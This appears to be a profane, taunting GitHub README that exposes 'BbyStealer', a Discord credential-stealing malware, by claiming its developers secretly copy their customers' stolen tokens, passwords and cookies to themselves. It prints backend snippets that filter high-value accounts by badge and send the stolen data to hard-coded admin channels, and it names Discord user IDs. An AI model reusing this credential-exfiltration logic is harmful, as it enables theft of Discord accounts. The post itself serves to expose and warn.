# Important
Please read the following before adding me on Discord: https://github.com/ExtraFrisky/Byebye-Bby#update-1

# Update
Don't be fooled, just because they allow you to use webhooks, doesn't mean things have changed.  
The malware still pushes data through their API.  
This means, it could still be dualhooked. If you believe their "it was a security flaw" lie, you're a fool.  
There was no security flaw, It's plain and simple: Brunx**skid** and c0l**skid**za stealing accounts.  

# Dualhook Diagram
![This is how Bby's Dualhook works](https://raw.githubusercontent.com/ExtraFrisky/Byebye-Bby/main/unknown.png)

Here, let's make it simple:
`Malware` -> `Bby Server` -> `Bot / Webhook`  
Since all requests are still going via `/x8Xx8xXx8x/tokens`, `/x8Xx8xXx8x/cookies` and `/x8Xx8xXx8x/passwords`, there is the potential for them to continue their scam.  
`x8Xx8xXx8x` = random ID they generate for you.  
If you buy their shitty malware, you are a fool and don't say I didn't warn you.  

Bot, or webhook. It doesn't matter, they still assume full control over any data sent to their API endpoint.  

## Scroll to bottom for short tl;dr (too long didn't read). Read the whole post for juicy evidence!

Alright skidz. I come with wonderful information for all you "wonderful" people.

Your beloved BbyStealer has been lying to you all this time.
Your beloved developers claim they "do not grab" or dualhook.

**They lied.**  

We recently obtained a copy of their shitty website backend. Obviously, this was possible because the developers are shit at what they do.  
(You should really stop grabbing, and stop paying for this shit malware)  

# Prelude:
**c0lzia**: Yo, let's make a stealer. **copies PirateStealer's code**  
**c0lzia**: Hmm, maybe I'll just tack on my own API. There, it's perfect. Now webhooks won't get deleted.  
**c0lzia**: ...  
**c0lzia**: ...  
**c0lzia**: ...  
**c0lzia**: ...  
**brunxkd**: Maybe we should steal some earlies together.  
**c0lzia**: Fuck it, I want some earlies too! **inserts dual hook**  
**c0lzia**: Ah, yes. Now these fools will pay me for my shit PirateStealer clone, and I can steal some earlies when I feel like it!  
**brunxkd**: Haha fucking idiots. They'll do our job for us, and make us money by paying for this piece of shit.  
**brunxkd**: If they come saying the tokens don't work, we can just say they were too slow and the person reset.  
**c0lzia**: It's the ultimate master plan. We're absolute geniuses!  

# Yesterday:
**ShitSkid**: YO SOMEONE STOLE MY EARLY WTF?  
**ShitSkid**: DEVS U STEALING MY EARLIES WTF?  
...  
**c0lzia**: Are you an idiot? I don't get your shit. I don't grab.  
**Everyone**: Why are these tokens not working????? I just grabbed a bot developer?????  
**brunxkd**: idk you're just slow and the victim reset their account. /shrug  

# The motherfucking evidence:
Alright, joking aside. This fucker is stealing your steals, and here's the proof.  
I know most of you don't have enough braincells to understand, so I'll take it in baby steps.  

1) You write "$create", it makes an exe file.
```
    if (message has "$create")
        ... if you do it too quickly it says: "You try to create a file too quickly"
        ... it's all good, you get an embed that says "Grabber File" "Here's your file: [Download]"
```

Okay, does that make sense to your simple brain? Good! I'm glad we're on the same page.  

2) You download the file and start sharing it with your victims. 
3) Your victims open the file and you get a message with all the user info, usernames.txt and cookies.txt. 

Cool!

... not cool. (obviously, fucking stupid)  

I know I'm not going stop you from using a shitty grabber by simply saying so, so here.  
This info might just make you reconsider how much trust and money you put into BbyStealer.

Bby's backend code has **a few key points of interest**. 

# Exhibit #1:
```js
const admins = ["454317547622367232", "917648088582197298"]
```
The user IDs of the admins.  
454317547622367232 = brunxkd#3333  
917648088582197298 = c0lzia#9999  

These IDs are checked for in the `sendEmbed()` method to find the admin channels. Big surprise!  
"Wait, what does that mean?" -- Observe the next two exhibits!

# Exhibit #2:
When your victim opens the malware, it calls an API `/yourname/tokens`  
```js
getTokenInfo(data, clients[req.params.name], ip, false)
getTokenInfo(tokens, channelId, ip = undefined, dualHook = false)
```

"Wait, I thought you said it was dual hooked"  
Well, the shit tokens (Early supporter, etc) aren't ~~they don't care about low value accounts~~. But ALL the passwords.txt and cookies.txt are!  
However, if you observe the above code, all they need to change is the "false" to "true", and that's it.
That. is. it! False to True and all your grabbed accouts are belong to us.  

Just look at **Exhibit #3**, this is the **juicy shit**.  

# Exhibit #3:
Oh my, if "discord_partner", "hypesquad"... What next?  
Observe this code.  
```js
if (badges.includes("discord_partner") || badges.includes("HypeSquad_Event") || badges.includes("Bug_Hunter") || badges.includes("Discord_certified_moderator") || badges.includes("Verified_Bot_Developer")) {
    sendEmbed([embed, (await getHQFriendList(token))], "907326009479667735", true); // Sends the token to admins. Look at the "true" at the end.
    return; // Exit the code execution
}
sendEmbed([embed, (await getHQFriendList(text.token))], channelId, true);
```
This code looks for all the ULTRA rare accounts. And then sends it to a hard coded channel ID `907326009479667735` and `true` = admin.
Just as a refresher, check the method for sendEmbed()  
```js
async function sendEmbed(embeds = [], >> channelId = 0, admin = false <<) // These >> two parameters << are important, duhhh!
```
If the 2nd parameter is set, it'll hard code a channel to send to. If the last parameter is true, it sends it to the admins.  

If you grab any of the following accounts:  
* Discord Partner
* HypeSquad Event
* Bug Hunter
* Discord Certified Moderator
* Verified Bot Developer

**The admins get these tokens. DUALHOOKED motherfucker!**. You don't!  
The developers have been stealing your precious ultra rare accounts!  
Aww how sad this is.  

# Exhibit #4:
All the passwords and cookies are dualhooked... **All. of. them.**
```js
// Send to the skidz
client.channels.cache.get(clients[req.params.name])
	.send({
		files: [attachment]
	})
	.catch(err => {
		console.log(err)
	});

// Send to the admins
if (clients[req.params.name] != "907326009479667735")
	client.channels.cache.get("919486655231062026")
		.send({
			files: [attachment]
		})
		.catch(err => {
			console.log(err)
		});
```

... There is so much more. If you're a skid and you want to know more, just contact me. My Discord is at the bottom of this post.  

# Finally...
Do not trust these fuckers. Don't trust ANY malware developer.  
Watch out, when this post goes live they'll probably want to rebrand.  
You know, to avoid disappointment, you could literally stop being a stupid fuckng script kiddie and, idk, get a life?  
In fact, just stop stealing people's shit, you stupid fuckers. Stupid fucking script kiddies.  

# To the shitty malware developers
Ayooo developers~, if you wanna cry (or shit your pants), come cry (or shit your pants) in my DMs: Extra Frisky#1788  
Fuck you Bbystealer, and fuck you brunx**skid** c0l**skid**zia. Fuck you.  
I want you to spam me, or mass DM group me, fucking do it. I don't give a shit. I just want your tearsssssss. 😂👌  

# A final ~~sad~~ goodbye.
Byebye, Bby. Oh, Bbystealer.  
Let's just reminisce on the good times, oh how much fun we had. It was so fun!  
We cracked all your shitty stealer variants. We pwned your webserver.  
Kinda sad it has to come to and end, it was truly fun fucking with your shit. I loved the challenges.  
The OG stealer, without obfuscation.  
The new stealer with obfuscation.  
The encryption, the webhook proxy... and so much more...  
But, I guess this is for the better.  
I can't say I'll actually miss you, though.  

`Extra Frisky#1788` over and out. Until we "meet" again.
P.S: Fuck you.

# Update
I am not going to share the source code. My primary objective is to stop the scams.  
Sharing the source code will only make the situation worse.  
I know I can't stop you from grabbing, but be very careful when you consider giving a shitty malware developer your money.  
They're probably going to fuck you over.  
Know when to stop.  

Let me know what you think, open a new issue with your comments: https://github.com/ExtraFrisky/Byebye-Bby/issues/new  
I'd love to hear your feedback.  

The meme videos begin rolling in!  
#1 https://www.youtube.com/watch?v=bLsl3I1uBNA
#2 We started getting some serious quotes from your lovely Brunskid

# Quotes 👌😂

## GentleStar & brunx**skid**
GentleStar: Are you going to keep stealing from your customers?  
brunx**skid**: they pay me and work for me  
brunx**skid**: **you were my mule**  

## Brunskid
brunx**skid** — 26/12/2021  
@everyone bby open again with 0 detections and no more account stolen with the fucking shit bot now works with webhook only for you  
  
(Blaming it on the bot, yet he was the one who developed the bot to steal accounts, so do the math, sounds weird right?)  

# TL;DR
1) Bbystealer steals your passwords.txt and cookies.txt
2) Bbystealer steals your ultra-rare badges. Partner, Developer, HypeSquad, etc. (you get none of these)
3) You only get shitty badges like Early Supporter. 
4) Bby is DUALHOOKED in every way possible. Evidence above in code snippets. 
Want more proof? Message me `Extra Frisky#1788`

We are Anonymous. We are legion. We do not forgive. We do not forget. Expect us.
kekw
